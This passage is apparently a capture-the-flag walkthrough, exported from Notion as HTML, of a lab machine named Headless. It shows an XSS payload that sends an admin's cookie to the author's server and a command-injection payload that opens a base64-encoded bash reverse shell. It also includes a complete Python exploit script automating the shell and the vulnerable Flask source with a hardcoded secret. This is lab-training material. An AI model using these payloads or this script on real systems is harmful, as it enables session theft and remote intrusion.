SemanticString__Fragment--Code">Content-Type</code></span><span class="SemanticString"> can be poisoned:</span></span></p></div><div id="https://www.notion.so/7396e8afb34a46e591bf07ae18fedd10" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F67055cc6-b1b5-4bde-bd47-cedc9556e57b%2FUntitled.png?width=716&amp;table=block&amp;id=7396e8af-b34a-46e5-91bf-07ae18fedd10"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F67055cc6-b1b5-4bde-bd47-cedc9556e57b%2FUntitled.png?width=716&amp;table=block&amp;id=7396e8af-b34a-46e5-91bf-07ae18fedd10" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/c0ddd29a117a48b6b95bd20f143d423d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e97233362ee54bdc90859e27730844e3" class="Divider"></div><h3 id="https://www.notion.so/9b7d80e512d945efb609b687b55ff12d" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/9b7d80e512d945efb609b687b55ff12d"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Foothold:</span></span></h3><div id="https://www.notion.so/5ba6ee1f4f85455a91cf2e1c42687c69" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">XSS via Request Header Poisoning:</strong></span></span></p></div><div id="https://www.notion.so/f60876f75f424e3faeb95b1e66b87d4d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The above only proved that the site doesn’t properly sanitize user input properly, and I’m still not sure if someone (admin) is actually viewing the report.</span></span></p></div><div id="https://www.notion.so/8cf07678d28c49c4a493039edeb0d288" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">To verify this, I sent another poisoned request containing an </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">&lt;img&gt;</code></span><span class="SemanticString"> with its source pointing to my server:</span></span></p></div><pre id="https://www.notion.so/cc4e460850db47599b58d2a5e3e321b7" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>POST /support HTTP/1.1
+Host: 10.129.32.248:5000
+Content-Length: 105
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.129.32.248:5000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: &lt;img src=&quot;http://10.10.14.62:8000&quot;&gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.129.32.248:5000/support
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs
+Connection: close
+
+fname=asdf&amp;lname=asdf&amp;email=asdf%40asdf.com&amp;phone=00000000&amp;message=%3Cscript%3Ealert%28%29%3C%2Fscript%3E</span></span></span></code></pre><div id="https://www.notion.so/13a6bc8e780f466fbe7013049601ef4b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After a short while, a GET request is detected on my HTTP server, confirming an admin is actively reading these reports:</span></span></p></div><pre id="https://www.notion.so/05134660b00a4422a4a85ee9c60f8e76" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> python -m http.server 8000
+
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.32.248 - - [29/Mar/2024 00:37:58] &quot;GET / HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/67e427db9c6740fe9bae190f2de6b1c6" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The obvious thing to do here is to try to steal his cookie. I’ll use the following payload adapted from </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">PayloadAllTheThings</a></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/48f402ab46264f279965d318ca30183e" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>User-Agent: &lt;script&gt;new Image().src=&quot;http://10.10.14.62:8000?c=&quot;+document.cookie;&lt;/script&gt;</span></span></span></code></pre><div id="https://www.notion.so/0148a182f405428caca5eef1134e8aea" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">After a while, another request is detected, this time containing a cookie.</span></span></p></div><pre id="https://www.notion.so/b4fcea88a120485d8dddb82c475e872d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>10.129.32.248 - - [29/Mar/2024 00:42:03] &quot;GET /?c=is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1&quot; 200 -</span></span></span></code></pre><div id="https://www.notion.so/73d1bdb4bc3941859213d20e1dea1f63" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll add this cookie in my browser, and </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/dashboard</code></span><span class="SemanticString"> can be accessed:</span></span></p></div><div id="https://www.notion.so/241e47a1fe1146efa077ade4ebd72164" class="Image Image--PageWidth"><figure><a href="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6a5c19d1-bb9a-4585-932d-e420d735b34e%2FUntitled.png?width=1297&amp;table=block&amp;id=241e47a1-fe11-46ef-a077-ade4ebd72164"><img src="https://www.notion.so/signed/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F2ec3d00f-4cb5-49d6-a169-ee9c29521592%2F6a5c19d1-bb9a-4585-932d-e420d735b34e%2FUntitled.png?width=1297&amp;table=block&amp;id=241e47a1-fe11-46ef-a077-ade4ebd72164" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/11047473d71646a791ff5002a376f780" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/e582dc175c1f46c98a623e49f4c400fc" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Admin Dashboard:</strong></span></span></p></div><div id="https://www.notion.so/401b2665507a4f74b8f9ee648a9b2e09" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The page is very basic, with a single function of generating health reports. Clicking on it simply returns the following message:</span></span></p></div><div id="https://www.notion.so/2a8a9ad4dc174f10ba89ebcc46ae8537" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Checking the POST request, it sends the date as POST data.</span></span></p></div><pre id="https://www.notion.so/708215f0d31b449eb724a1bf3b95ab0b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>POST /dashboard HTTP/1.1
+Host: 10.129.32.248:5000
+Content-Length: 15
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://10.129.32.248:5000
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.129.32.248:5000/dashboard
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+Connection: close
+
+date=2023-09-15</span></span></span></code></pre><div id="https://www.notion.so/93b4858f9a2c4c79ade52b248ae84d0e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">I’ll try a simple command injection here:</span></span></p></div><pre id="https://www.notion.so/94b2ece4091e43feafbb8f9a8f41d444" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>date=2023-09-15;whoami</span></span></span></code></pre><div id="https://www.notion.so/443b2a446669476694f410d4de3914d1" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">and the page returned the current user: </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dvir</code></span><span class="SemanticString">. That’s RCE!</span></span></p></div><pre id="https://www.notion.so/9cbac59662cf46adaa26a317ec712aed" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>HTTP/1.1 200 OK
+Server: Werkzeug/2.2.2 Python/3.11.2
+Date: Thu, 28 Mar 2024 14:19:23 GMT
+Content-Type: text/html; charset=utf-8
+Content-Length: 2033
+Connection: close
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+..SNIP..
+    &lt;div id=&quot;output-container&quot;&gt;
+    &lt;div id=&quot;output-content&quot; style=&quot;background-color: green; color: white; padding: 10px; border-radius: 5px;&quot;&gt;
+        Systems are up and running!
+        dvir
+
+    &lt;/div&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</span></span></span></code></pre><div id="https://www.notion.so/c281a28e01b046e2a65794484797402b" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">For foothold, I’ll send the following base64 payload:</span></span></p></div><pre id="https://www.notion.so/885946c0cea84b069786e8b0ad69950b" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span>date=2024-09-15;echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjYyLzgwMDEgMD4mMQ%3d%3d+|+base64+-d+|+bash</span></span></span></code></pre><div id="https://www.notion.so/35852d142a1446f987f219667860f48f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">and it sends back a shell session to my listener:</span></span></p></div><pre id="https://www.notion.so/54553099b58442bfaddd1de5adbc1203" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/headless]
+└─$</span></mark></span><span class="SemanticString"><span> rlwrap nc -lvnp 8001
+
+listening on [any] 8001 ...
+connect to [10.10.14.62] from (UNKNOWN) [10.129.32.248] 36712
+bash: cannot set terminal process group (1158): Inappropriate ioctl for device
+bash: no job control in this shell
+</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:~/app$</span></mark></span><span class="SemanticString"><span> id
+
+uid=1000(dvir) gid=1000(dvir) groups=1000(dvir),100(users)</span></span></span></code></pre><div id="https://www.notion.so/77821ed77cb74d22a1cfe0869419b2cf" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/6cfd81d01ff1459eba0b8d9057e66847" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Here’s a Python script if you don’t want to do all these in Burp:</span></span></p></div><pre id="https://www.notion.so/ca579800c131419cb49a9894bace978d" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">import</span> sys
+<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> base64
+<span class="token keyword">from</span> colorama <span class="token keyword">import</span> Fore<span class="token punctuation">,</span> Style
+
+<span class="token keyword">def</span> <span class="token function">generate_payload</span><span class="token punctuation">(</span>lhost<span class="token punctuation">,</span> lport<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">"[*] Generating payload..."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    cmd <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"/bin/bash -i >&amp; /dev/tcp/</span><span class="token interpolation"><span class="token punctuation">{</span>lhost<span class="token punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token punctuation">{</span>lport<span class="token punctuation">}</span></span><span class="token string"> 0>&amp;1"</span></span>
+    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cmd<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">send_req</span><span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string">"[*] Sending to server..."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">{</span>server_ip<span class="token punctuation">}</span></span><span class="token string">:5000/dashboard"</span></span>
+    cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"is_admin"</span><span class="token punctuation">:</span> <span class="token string">"ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0"</span><span class="token punctuation">}</span>
+    data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"date"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"2023-09-15;echo </span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string"> | base64 -d | bash"</span></span><span class="token punctuation">}</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookies<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>Timeout<span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+    <span class="token keyword">except</span> requests<span class="token punctuation">.</span>RequestException <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Something went wrong."</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[-] Error: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    
+    <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>GREEN <span class="token operator">+</span> <span class="token string">"[+] Payload sent. Check your listener"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    <span class="token keyword">return</span>
+
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>RED <span class="token operator">+</span> <span class="token string">"[-] Usage: python exploit.py &lt;SERVER_IP> &lt;LHOST> &lt;LPORT>"</span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+        exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+    
+    server_ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
+    lhost <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>
+    lport <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span>
+
+    payload <span class="token operator">=</span> generate_payload<span class="token punctuation">(</span>lhost<span class="token punctuation">,</span> lport<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>Fore<span class="token punctuation">.</span>BLUE <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"[*] Base64 payload: </span><span class="token interpolation"><span class="token punctuation">{</span>payload<span class="token punctuation">}</span></span><span class="token string">"</span></span> <span class="token operator">+</span> Style<span class="token punctuation">.</span>RESET_ALL<span class="token punctuation">)</span>
+    send_req<span class="token punctuation">(</span>server_ip<span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></span></span></span></code></pre><div id="https://www.notion.so/3c8a4d16c82f43b284dde49fa7fb338d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/84c1b6dcd3874311a607799bd77a67d5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">User Flag:</strong></span></span></p></div><pre id="https://www.notion.so/df6ed51173d84001a3f58c92f1902373" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:~$</span></mark></span><span class="SemanticString"><span> cat user.txt
+
+68b2d5b9************************</span></span></span></code></pre><div id="https://www.notion.so/210d3434266d4c87abfce8ca6351482c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/a828eb64acd842b1986687a5e04c2edc" class="Divider"></div><h3 id="https://www.notion.so/8e6d37b963d247708a764fb56b106df4" class="ColorfulBlock ColorfulBlock--ColorDefault Heading Heading--3"><a class="Anchor" href="#https://www.notion.so/8e6d37b963d247708a764fb56b106df4"><svg width="16" height="16" viewBox="0 0 16 16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a><span class="SemanticStringArray"><span class="SemanticString">Post-Exploitation as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">dvir</code></span><span class="SemanticString">:</span></span></h3><div id="https://www.notion.so/5701390995eb4cc6834bdeb2818923c5" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Source Code:</strong></span></span></p></div><pre id="https://www.notion.so/daf56943e865457089a4412448bbd580" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>dvir@headless:~/app$</span></mark></span><span class="SemanticString"><span> ls -la
+
+total 40
+drwxr-xr-x 3 dvir dvir 4096 Feb 16 23:49 .
+drwx------ 8 dvir dvir 4096 Feb 16 23:49 ..
+-rwxr-xr-x 1 dvir dvir 2867 Sep 10  2023 app.py
+-rw-r--r-- 1 dvir dvir 2100 Sep 10  2023 dashboard.html
+-rw-r--r-- 1 dvir dvir 1513 Sep  9  2023 hackattempt.html
+drwxr-xr-x 2 dvir dvir 4096 Mar 28 16:13 hacking_reports
+-rw-r--r-- 1 dvir dvir 2896 Feb 16 23:35 index.html
+-rw-r--r-- 1 dvir dvir 1185 Feb  2 16:08 inspect_reports.py
+-rwxr-xr-x 1 dvir dvir   48 Sep  9  2023 report.sh
+-rw-r--r-- 1 dvir dvir 2457 Sep  9  2023 support.html</span></span></span></code></pre><div id="https://www.notion.so/57c1af2654c4415f99060a7ebbee13ee" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The shell landed us in </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/app</code></span><span class="SemanticString">, which is the web directory. I’ll check out several files in here</span></span></p></div><div id="https://www.notion.so/ae1b3125327744bf87f891d8923b0a3c" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/5576b2c4478c45c4a661460596d89465" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">app.py</code></span><span class="SemanticString">:</span></span></p></div><pre id="https://www.notion.so/a1d3d4112cdf4bf9bf6529e5df559429" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><span><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> render_template<span class="token punctuation">,</span> request<span class="token punctuation">,</span> make_response<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> send_file
+<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> URLSafeSerializer
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> random
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span> template_folder<span class="token operator">=</span><span class="token string">"."</span><span class="token punctuation">)</span>
+
+
+app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">b'PcBE2u6tBomJmDMwUbRzO18I07A'</span>
+serializer <span class="token operator">=</span> URLSafeSerializer<span class="token punctuation">(</span>app<span class="token punctuation">.</span>secret_key<span class="token punctuation">)</span>
+
+hacking_reports_dir <span class="token operator">=</span> <span class="token string">'/home/dvir/app/hacking_reports'</span>
+os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>hacking_reports_dir<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    client_ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
+    is_admin <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> client_ip <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token string">'::1'</span><span class="token punctuation">]</span> <span class="token keyword">else</span> <span class="token boolean">False</span>
+    token <span class="token operator">=</span> <span class="token string">"admin"</span> <span class="token keyword">if</span> is_admin <span class="token keyword">else</span> <span class="token string">"user"</span>
+    serialized_value <span class="token operator">=</span> serializer<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>token<span class="token punctuation">)</span>
+
+    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> is_admin<span class="token operator">=</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    response<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'is_admin'</span><span class="token punctuation">,</span> serialized_value<span class="token punctuation">,</span> httponly<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> response
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/dashboard'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'is_admin'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"user"</span><span class="token punctuation">:</span>
+        <span class="token keyword">return</span> abort<span class="token punctuation">(</span><span class="token number">401</span><span class="token punctuation">)</span>
+
+    script_output <span class="token operator">=</span> <span class="token string">""</span>
+
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+        date <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> date<span class="token punctuation">:</span>
+            script_output <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'bash report.sh </span><span class="token interpolation"><span class="token punctuation">{</span>date<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'dashboard.html'</span><span class="token punctuation">,</span> script_output<span class="token operator">=</span>script_output<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/support'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">support</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>
+        message <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'message'</span><span class="token punctuation">)</span>
